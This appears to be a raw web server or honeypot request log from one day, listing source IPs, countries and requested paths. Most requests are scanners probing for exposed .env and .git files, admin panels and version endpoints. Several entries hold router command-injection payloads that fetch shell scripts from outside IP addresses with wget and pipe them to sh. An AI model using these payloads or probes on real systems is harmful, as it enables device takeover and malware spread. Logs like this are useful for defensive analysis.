"2025-06-16","78.153.140.224","United Kingdom","HTTP","/.env"
"2025-06-16","78.153.140.224","United Kingdom","HTTP","/api/.env"
"2025-06-16","78.153.140.224","United Kingdom","HTTP","/backend/.env"
"2025-06-16","78.153.140.224","United Kingdom","HTTP","/admin/.env"
"2025-06-16","78.153.140.224","United Kingdom","HTTP","/.env.example"
"2025-06-16","78.153.140.224","United Kingdom","HTTP","/app_dev.php/_profiler/phpinfo"
"2025-06-16","78.153.140.224","United Kingdom","HTTP","/?phpinfo=-1"
"2025-06-16","196.251.72.29","Seychelles","HTTP","/.env"
"2025-06-16","199.45.155.111","United States","HTTP","/favicon.ico"
"2025-06-16","199.45.155.111","United States","HTTP","/favicon.ico"
"2025-06-16","199.45.155.111","United States","HTTP","/.well-known/security.txt"
"2025-06-16","199.45.155.111","United States","HTTP","/favicon.ico"
"2025-06-16","45.135.194.34","The Netherlands","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F14.103.145.211%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F14.103.145.211%2Frondo.sh%29+%7C+sh+-s+tplink%3B)"
"2025-06-16","196.251.117.9","The Netherlands","HTTP","/.env"
"2025-06-16","87.255.194.135","Kazakhstan","HTTP","/admin/configs.php"
"2025-06-16","65.49.1.156","United States","HTTP","/favicon.ico"
"2025-06-16","65.49.1.156","United States","HTTP","/geoserver/web/"
"2025-06-16","198.55.98.76","United States","HTTP","/.env"
"2025-06-16","165.22.142.68","United States","HTTP","/form.html"
"2025-06-16","165.22.142.68","United States","HTTP","/geoip/"
"2025-06-16","165.22.142.68","United States","HTTP","/password.php"
"2025-06-16","165.22.142.68","United States","HTTP","/t4"
"2025-06-16","165.22.142.68","United States","HTTP","/favicon.ico"
"2025-06-16","165.22.142.68","United States","HTTP","/1.php"
"2025-06-16","165.22.142.68","United States","HTTP","/upl.php"
"2025-06-16","165.22.142.68","United States","HTTP","/systembc/password.php"
"2025-06-16","207.167.67.206","United States","HTTP","http://example.com/"
"2025-06-16","207.167.67.206","United States","HTTP","http://example.com/"
"2025-06-16","170.39.218.2","Canada","HTTP","/.git/config"
"2025-06-16","87.121.84.34","United States","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://31.59.40.187/x/tplink+-O-|sh)"
"2025-06-16","87.121.84.34","United States","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://31.59.40.187/x/tplink+-O-|sh)"
"2025-06-16","45.135.194.34","The Netherlands","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F14.103.145.211%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F14.103.145.211%2Frondo.sh%29+%7C+sh+-s+tplink%3B)"
"2025-06-16","139.144.52.241","United States","HTTP","/cgi-mod/header_logo.cgi?size=big"
"2025-06-16","139.144.52.241","United States","HTTP","/webui"
"2025-06-16","139.144.52.241","United States","HTTP","/CSS/Miniweb.css"
"2025-06-16","139.144.52.241","United States","HTTP","/sdk"
"2025-06-16","139.144.52.241","United States","HTTP","/health"
"2025-06-16","139.144.52.241","United States","HTTP","/CSnX"
"2025-06-16","139.144.52.241","United States","HTTP","/scripts/WPnBr.dll"
"2025-06-16","139.144.52.241","United States","HTTP","/rest/applinks/1.0/manifest"
"2025-06-16","139.144.52.241","United States","HTTP","/Portal0000.htm"
"2025-06-16","139.144.52.241","United States","HTTP","/nmaplowercheck1750084834"
"2025-06-16","139.144.52.241","United States","HTTP","/.git/HEAD"
"2025-06-16","139.144.52.241","United States","HTTP","/cgi-mod/header_logo.cgi?size=big"
"2025-06-16","139.144.52.241","United States","HTTP","/sdk"
"2025-06-16","139.144.52.241","United States","HTTP","/HNAP1"
"2025-06-16","139.144.52.241","United States","HTTP","/webui"
"2025-06-16","139.144.52.241","United States","HTTP","/confluence/rest/applinks/1.0/manifest"
"2025-06-16","139.144.52.241","United States","HTTP","/CSS/Miniweb.css"
"2025-06-16","139.144.52.241","United States","HTTP","/.git/HEAD"
"2025-06-16","139.144.52.241","United States","HTTP","/health"
"2025-06-16","139.144.52.241","United States","HTTP","/__Additional"
"2025-06-16","139.144.52.241","United States","HTTP","/login.php"
"2025-06-16","139.144.52.241","United States","HTTP","/scripts/WPnBr.dll"
"2025-06-16","139.144.52.241","United States","HTTP","/rest/applinks/1.0/manifest"
"2025-06-16","139.144.52.241","United States","HTTP","/nmaplowercheck1750084834"
"2025-06-16","139.144.52.241","United States","HTTP","/Portal/Portal.mwsl"
"2025-06-16","139.144.52.241","United States","HTTP","/owa/"
"2025-06-16","139.144.52.241","United States","HTTP","/inicio.cfm"
"2025-06-16","139.144.52.241","United States","HTTP","/dniapi/userInfos"
"2025-06-16","139.144.52.241","United States","HTTP","/SdcB"
"2025-06-16","139.144.52.241","United States","HTTP","/docs/cplugError.html/"
"2025-06-16","139.144.52.241","United States","HTTP","/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42"
"2025-06-16","139.144.52.241","United States","HTTP","/confluence/rest/applinks/1.0/manifest"
"2025-06-16","139.144.52.241","United States","HTTP","/HNAP1"
"2025-06-16","139.144.52.241","United States","HTTP","/owa/"
"2025-06-16","139.144.52.241","United States","HTTP","/pools/default/buckets"
"2025-06-16","139.144.52.241","United States","HTTP","/server-status"
"2025-06-16","139.144.52.241","United States","HTTP","/owa/"
"2025-06-16","139.144.52.241","United States","HTTP","/index.cgi"
"2025-06-16","139.144.52.241","United States","HTTP","/api/v2/about"
"2025-06-16","139.144.52.241","United States","HTTP","/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000"
"2025-06-16","139.144.52.241","United States","HTTP","/favicon.ico"
"2025-06-16","139.144.52.241","United States","HTTP","/server-status"
"2025-06-16","139.144.52.241","United States","HTTP","/owa/"
"2025-06-16","139.144.52.241","United States","HTTP","/login.php"
"2025-06-16","139.144.52.241","United States","HTTP","/pools"
"2025-06-16","139.144.52.241","United States","HTTP","/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42"
"2025-06-16","139.144.52.241","United States","HTTP","/base.jsa"
"2025-06-16","139.144.52.241","United States","HTTP","/inicio.cfm"
"2025-06-16","139.144.52.241","United States","HTTP","/webui"
"2025-06-16","139.144.52.241","United States","HTTP","/dniapi/userInfos"
"2025-06-16","139.144.52.241","United States","HTTP","/nmaplowercheck1750084834"
"2025-06-16","139.144.52.241","United States","HTTP","/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000"
"2025-06-16","139.144.52.241","United States","HTTP","/start.cfm"
"2025-06-16","139.144.52.241","United States","HTTP","/Portal0000.htm"
"2025-06-16","139.144.52.241","United States","HTTP","/Portal/Portal.mwsl"
"2025-06-16","139.144.52.241","United States","HTTP","/index.cgi"
"2025-06-16","139.144.52.241","United States","HTTP","/user"
"2025-06-16","139.144.52.241","United States","HTTP","/api/v2/about"
"2025-06-16","139.144.52.241","United States","HTTP","/pools/default/buckets"
"2025-06-16","139.144.52.241","United States","HTTP","/inicio.shtml"
"2025-06-16","139.144.52.241","United States","HTTP","/base.jsa"
"2025-06-16","139.144.52.241","United States","HTTP","/__Additional"
"2025-06-16","139.144.52.241","United States","HTTP","/docs/cplugError.html/"
"2025-06-16","139.144.52.241","United States","HTTP","/human.aspx?arg12=infotech"
"2025-06-16","139.144.52.241","United States","HTTP","/webui"
"2025-06-16","139.144.52.241","United States","HTTP","/pools"
"2025-06-16","139.144.52.241","United States","HTTP","/readme.txt"
"2025-06-16","139.144.52.241","United States","HTTP","/dana-cached/hc/HostCheckerInstaller.osx"
"2025-06-16","139.144.52.241","United States","HTTP","/start.cfm"
"2025-06-16","139.144.52.241","United States","HTTP","/user"
"2025-06-16","139.144.52.241","United States","HTTP","/start.shtml"
"2025-06-16","139.144.52.241","United States","HTTP","/dana-na/nc/nc_gina_ver.txt"
"2025-06-16","139.144.52.241","United States","HTTP","/inicio.shtml"
"2025-06-16","139.144.52.241","United States","HTTP","/favicon.ico"
"2025-06-16","139.144.52.241","United States","HTTP","/human.aspx?arg12=infotech"
"2025-06-16","139.144.52.241","United States","HTTP","/localstart.jhtml"
"2025-06-16","139.144.52.241","United States","HTTP","/+CSCOE+/logon.html"
"2025-06-16","139.144.52.241","United States","HTTP","/readme.txt"
"2025-06-16","139.144.52.241","United States","HTTP","/dana-cached/hc/HostCheckerInstaller.osx"
"2025-06-16","139.144.52.241","United States","HTTP","/base.shtml"
"2025-06-16","139.144.52.241","United States","HTTP","/CFIDE/componentutils/"
"2025-06-16","139.144.52.241","United States","HTTP","/start.shtml"
"2025-06-16","139.144.52.241","United States","HTTP","/dana-na/nc/nc_gina_ver.txt"
"2025-06-16","139.144.52.241","United States","HTTP","/inicio.aspx"
"2025-06-16","139.144.52.241","United States","HTTP","/geoserver/index.html"
"2025-06-16","139.144.52.241","United States","HTTP","/localstart.jhtml"
"2025-06-16","139.144.52.241","United States","HTTP","/+CSCOE+/logon.html"
"2025-06-16","139.144.52.241","United States","HTTP","/localstart.asp"
"2025-06-16","139.144.52.241","United States","HTTP","/geoserver/"
"2025-06-16","139.144.52.241","United States","HTTP","/base.shtml"
"2025-06-16","139.144.52.241","United States","HTTP","/CFIDE/componentutils/"
"2025-06-16","139.144.52.241","United States","HTTP","/robots.txt"
"2025-06-16","139.144.52.241","United States","HTTP","/geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage"
"2025-06-16","139.144.52.241","United States","HTTP","/inicio.aspx"
"2025-06-16","139.144.52.241","United States","HTTP","/Account/Login"
"2025-06-16","139.144.52.241","United States","HTTP","/menu.html"
"2025-06-16","139.144.52.241","United States","HTTP","/geoserver/index.html"
"2025-06-16","139.144.52.241","United States","HTTP","/localstart.asp"
"2025-06-16","139.144.52.241","United States","HTTP","/cgi-bin/info.cgi"
"2025-06-16","139.144.52.241","United States","HTTP","/geoserver/"
"2025-06-16","139.144.52.241","United States","HTTP","/menu.jsa"
"2025-06-16","139.144.52.241","United States","HTTP","/robots.txt"
"2025-06-16","139.144.52.241","United States","HTTP","/base.pl"
"2025-06-16","139.144.52.241","United States","HTTP","/xml/info.xml"
"2025-06-16","139.144.52.241","United States","HTTP","/geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage"
"2025-06-16","139.144.52.241","United States","HTTP","/menu.html"
"2025-06-16","139.144.52.241","United States","HTTP","/inicio.pl"
"2025-06-16","139.144.52.241","United States","HTTP","/Account/Login"
"2025-06-16","139.144.52.241","United States","HTTP","/magento_version"
"2025-06-16","139.144.52.241","United States","HTTP","/menu.jsa"
"2025-06-16","139.144.52.241","United States","HTTP","/main.cgi"
"2025-06-16","139.144.52.241","United States","HTTP","/cgi-bin/info.cgi"
"2025-06-16","139.144.52.241","United States","HTTP","/api/v1/check-version"
"2025-06-16","139.144.52.241","United States","HTTP","/default.jsa"
"2025-06-16","139.144.52.241","United States","HTTP","/base.pl"
"2025-06-16","139.144.52.241","United States","HTTP","/xml/info.xml"
"2025-06-16","139.144.52.241","United States","HTTP","/fog/management/index.php?node=client\u0026sub=logininfo"
"2025-06-16","139.144.52.241","United States","HTTP","/admin.jsa"
"2025-06-16","139.144.52.241","United States","HTTP","/inicio.pl"
"2025-06-16","139.144.52.241","United States","HTTP","/magento_version"
"2025-06-16","139.144.52.241","United States","HTTP","/helpdesk/WebObjects/Helpdesk.woa"
"2025-06-16","139.144.52.241","United States","HTTP","/admin.jhtml"
"2025-06-16","139.144.52.241","United States","HTTP","/main.cgi"
"2025-06-16","139.144.52.241","United States","HTTP","/api/v1/check-version"
"2025-06-16","139.144.52.241","United States","HTTP","/index.aspx"
"2025-06-16","139.144.52.241","United States","HTTP","/cluster/list.query"
"2025-06-16","139.144.52.241","United States","HTTP","/default.jsa"
"2025-06-16","139.144.52.241","United States","HTTP","/fog/management/index.php?node=client\u0026sub=logininfo"
"2025-06-16","139.144.52.241","United States","HTTP","/apps/zxtm/login.cgi"
"2025-06-16","139.144.52.241","United States","HTTP","/home.shtml"
"2025-06-16","139.144.52.241","United States","HTTP","/admin.jsa"
"2025-06-16","139.144.52.241","United States","HTTP","/helpdesk/WebObjects/Helpdesk.woa"
"2025-06-16","139.144.52.241","United States","HTTP","/api/server/version"
"2025-06-16","139.144.52.241","United States","HTTP","/index.jhtml"
"2025-06-16","139.144.52.241","United States","HTTP","/admin.jhtml"
"2025-06-16","139.144.52.241","United States","HTTP","/cluster/list.query"
"2025-06-16","139.144.52.241","United States","HTTP","/administrator/manifests/files/joomla.xml"
"2025-06-16","139.144.52.241","United States","HTTP","/index.aspx"
"2025-06-16","139.144.52.241","United States","HTTP","/apps/zxtm/login.cgi"
"2025-06-16","139.144.52.241","United States","HTTP","/language/en-GB/en-GB.xml"
"2025-06-16","139.144.52.241","United States","HTTP","/indice.php"
"2025-06-16","139.144.52.241","United States","HTTP","/home.shtml"
"2025-06-16","139.144.52.241","United States","HTTP","/api/server/version"
"2025-06-16","139.144.52.241","United States","HTTP","/versa/login"
"2025-06-16","139.144.52.241","United States","HTTP","/admin.html"
"2025-06-16","139.144.52.241","United States","HTTP","/index.jhtml"
"2025-06-16","139.144.52.241","United States","HTTP","/administrator/manifests/files/joomla.xml"
"2025-06-16","139.144.52.241","United States","HTTP","/login.html"
"2025-06-16","139.144.52.241","United States","HTTP","/admin.cgi"
"2025-06-16","139.144.52.241","United States","HTTP","/p/login/"
"2025-06-16","139.144.52.241","United States","HTTP","/language/en-GB/en-GB.xml"
"2025-06-16","139.144.52.241","United States","HTTP","/main.shtml"
"2025-06-16","139.144.52.241","United States","HTTP","/indice.php"
"2025-06-16","139.144.52.241","United States","HTTP","/versa/login"
"2025-06-16","139.144.52.241","United States","HTTP","/api/version"
"2025-06-16","139.144.52.241","United States","HTTP","/base.cgi"
"2025-06-16","139.144.52.241","United States","HTTP","/admin.html"
"2025-06-16","139.144.52.241","United States","HTTP","/portal/"
"2025-06-16","139.144.52.241","United States","HTTP","/login.html"
"2025-06-16","139.144.52.241","United States","HTTP","/admin.cgi"
"2025-06-16","139.144.52.241","United States","HTTP","/start.cgi"
"2025-06-16","139.144.52.241","United States","HTTP","/status"
"2025-06-16","139.144.52.241","United States","HTTP","/p/login/"
